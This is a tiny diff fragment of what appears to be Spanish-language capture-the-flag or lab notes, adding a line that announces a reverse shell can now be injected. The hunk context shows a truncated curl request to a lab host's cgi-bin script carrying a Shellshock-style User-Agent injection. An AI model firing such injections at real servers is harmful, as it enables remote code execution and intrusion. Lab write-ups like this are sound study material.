@@ -98,4 +98,6 @@ curl -s -X GET "http://10.129.55.231/cgi-bin/user.sh" -H "User-Agent: () { :; };
 
 ![[Pasted image 20260909130106.png]]
 
+Ahora podremos inyectar una *Reverse Shell*
+
 
